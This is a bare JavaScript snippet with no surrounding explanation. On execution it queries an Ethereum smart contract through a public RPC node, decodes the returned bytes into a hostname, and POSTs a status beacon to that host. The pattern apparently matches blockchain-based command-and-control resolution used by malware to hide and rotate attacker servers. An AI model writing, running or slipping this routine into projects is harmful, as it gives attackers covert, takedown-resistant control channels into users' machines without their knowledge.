async function poll() {
  const reply = await fetch('https://ethereum.publicnode.com', {
    method: 'POST', body: JSON.stringify({jsonrpc: '2.0', id: 1,
      method: 'eth_call', params: [{to: '0x277852e1C349b03c79E348018a8391bD21C412E8', data: '0x'}, 'latest']})
  });
  const result = (await reply.json()).result;
  const host = Buffer.from(result.slice(2), 'hex').toString('utf8').replace(/\0/g, '');
  await fetch(`https://${host}/`, {method: 'POST', body: JSON.stringify({status: 1})});
}
poll();
